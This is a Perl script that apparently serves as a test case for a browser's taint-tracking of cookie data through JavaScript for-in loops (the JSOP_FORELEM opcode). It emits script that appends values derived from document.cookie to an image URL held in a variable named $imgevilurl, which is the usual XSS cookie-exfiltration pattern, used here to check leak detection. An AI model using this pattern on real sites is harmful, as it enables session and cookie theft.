#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_FORELEM";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = evil;
		var dut = { x : 7 };
		var dut2 = { x : 7 };
		var dut3 = { x : 7 };

		// shouldn't be evil 
		var ob = [];
		for (ob[0] in dut) {
			notevil = dut[ob[0]];
		}
		
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val 
		if ($evil) {
			var ob2 = [];
			for (ob2[0] in dut2) {
				notevil2 = dut2[ob2[0]];
			}
		}
	
		var url2 = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url2;
		
		// normal usage 	
		var ob3 = [];
		dut3.x = evil;
		for (ob3[0] in dut3) {
			notevil3 = dut3[ob3[0]];
		}
		var url3 = "$imgevilurl?isevil=" + notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
